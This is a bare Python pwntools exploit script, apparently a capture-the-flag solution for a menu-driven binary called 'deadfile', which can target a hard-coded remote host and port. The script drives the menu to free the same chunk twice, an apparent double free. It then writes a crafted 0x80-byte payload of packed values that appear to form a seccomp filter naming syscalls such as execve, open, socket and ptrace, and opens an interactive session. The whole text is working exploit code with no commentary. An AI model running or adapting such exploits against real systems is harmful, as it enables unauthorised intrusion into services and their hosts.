from pwn import *

e = ELF("./deadfile")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("115.68.235.72", 33445)
else:
  p = process(e.path)

p.sendlineafter(">>", "1")
p.sendlineafter(":", str(0x80))
p.recvuntil("Success")

p.sendlineafter(">>", "2")
p.sendlineafter(":", "0")
p.recvuntil("Success")

p.sendlineafter(">>", "2")
p.sendlineafter(":", "0")
p.recvuntil("Success")

p.sendlineafter(">>", "7")
p.sendlineafter(":", (
    p64(0x400000020)
    + p64(0xc000003e0d000015)
    + p64(0x20)
    + p64(0x40000000000b0025)
    + p64(0x3b000a0015)
    + p64(0x14200090015)
    + p64(0x200080015)
    + p64(0x10100070015)
    + p64(0x3800060015)
    + p64(0x3900050015)
    + p64(0x6500040015)
    + p64(0x2900030015)
    + p64(0x3100020015)
    + p64(0x3200010015)
    + p64(0x7fff000000000006) * 2
  ).ljust(0x80, "\x00")
)


p.interactive()
